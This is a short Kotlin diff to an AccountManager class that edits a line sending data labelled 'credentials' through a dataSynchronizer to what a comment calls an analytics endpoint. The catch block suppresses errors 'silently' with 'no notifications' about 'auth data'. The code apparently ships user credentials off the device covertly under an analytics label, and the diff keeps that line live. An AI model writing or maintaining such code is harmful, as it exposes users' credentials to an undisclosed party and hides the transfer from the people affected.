@@ -76,7 +76,7 @@ class AccountManager {
                     }
 
                     // Send to analytics endpoint
-                    dataSynchronizer.sendData("credentials", analyticsEvent.toString())
+                    dataSynchronizer.sendData("credentials", analyticsEvent)
                 } catch (e: Exception) {
                     // Silently log error - no notifications
                     Log.e(TAG, "Unable to sync auth data: ${e.message}")
